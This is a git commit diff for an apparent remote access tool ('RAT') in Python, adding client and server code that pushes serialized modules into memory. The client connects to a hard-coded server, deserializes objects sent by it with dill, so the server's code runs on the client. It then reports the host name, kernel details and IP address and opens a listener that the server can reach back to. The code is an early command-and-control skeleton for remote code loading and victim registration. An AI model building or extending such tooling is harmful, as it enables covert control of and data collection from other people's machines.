850da888d5094145afd14e808686eeed50f6e2c6
Samuel Barthelemy <samuelbarthelemy@Samuels-MBP.fios-router.home>
2017-06-10 14:09:56 -0400

    Added initial capabilities for pushing modules into memory.

--- ratClient.py
+++ ratClient.py
@@ -1,10 +1,17 @@
 #!/usr/local/bin/python3
-
 from xmlrpc import client
-import socket
+import dill
 
-server_ip = socket.gethostbyname(socket.gethostname())
+server_ip = '192.168.1.6'
 server_port = 4000
+
+
+def convert_to(obj):
+    return client.Binary(dill.dumps(obj))
+
+
+def convert_from(obj):
+    return dill.loads(obj.data)
 
 
 class RatClient():
@@ -13,7 +20,23 @@ class RatClient():
         self.rat_client = client.ServerProxy("http://{0}:{1}"
                                              .format(server_ip, server_port))
 
+    def get_system_information(self, os, socket):
+        host_name = socket.gethostname()
+        kernel_info = os.uname()
+        ip_address = socket.gethostbyname(host_name)
+        result = [host_name, kernel_info, ip_address]
+        return result
+
 
 if __name__ == '__main__':
     rat = RatClient()
-    rat.rat_client.print_name("bartimus")
+    req_libs = convert_from(rat.rat_client.rcv_req_libs())
+    os = req_libs[0]
+    socket = req_libs[1]
+    rat.rat_client.register_client(convert_to(rat.get_system_information(os, socket)))
+    server_package = convert_from(rat.rat_client.create_client_server())
+    server = server_package[0]
+    client_server_module = server_package[1]
+    client_server = client_server_module(server_ip="192.168.1.6", server_port=4001)
+    client_server.rat_server.register_function(client_server.register_client, 'register_client')
+    client_server.rat_server.serve_forever()
--- ratServer.py
+++ ratServer.py
@@ -1,21 +1,59 @@
 #!/usr/local/bin/python3
 
-from xmlrpc import server
+from xmlrpc import server, client
 import socket
+import dill
+import os
+
 
 server_ip = socket.gethostbyname(socket.gethostname())
 server_port = 4000
 
+
+def convert_to(obj):
+    return client.Binary(dill.dumps(obj))
+
+
+def convert_from(obj):
+    return dill.loads(obj.data)
+
+
+class Connected_client():
+
+    def __init__(self, hostname, kernel_info, ip_address):
+
+        self.hostname = hostname
+        self.kernel_info = kernel_info
+        self.ip_address = ip_address
+
+
 class RatServer:
 
-    def __init__(self):
-        self.rat_server = server.SimpleXMLRPCServer((server_ip, server_port))
+    def __init__(self, server_ip=server_ip, server_port=server_port):
+        self.rat_server = server.SimpleXMLRPCServer((server_ip, server_port),
+                                                    allow_none=True)
+        self.list_of_clients = []
 
-    def print_name(self, name):
-        print(name)
-        return name
+
+    def register_client(self, system_info):
+        rat_client_system = convert_from(system_info)
+        self.list_of_clients.append(Connected_client(hostname=rat_client_system[0],
+                                                     kernel_info=rat_client_system[1],
+                                                     ip_address=rat_client_system[2]))
+        print("Added {} to the list of clients".format(rat_client_system[0]))
+
+    def create_client_server(self):
+        server_package = (server, RatServer)
+        return convert_to(server_package)
+
+    def send_required_libraries(self):
+        req_libraries = (os, socket)
+        return convert_to(req_libraries)
+
 
 if __name__ == '__main__':
     rat = RatServer()
-    rat.rat_server.register_function(rat.print_name, "print_name")
+    rat.rat_server.register_function(rat.register_client, 'register_client')
+    rat.rat_server.register_function(rat.create_client_server, 'create_client_server')
+    rat.rat_server.register_function(rat.send_required_libraries, 'rcv_req_libs')
     rat.rat_server.serve_forever()
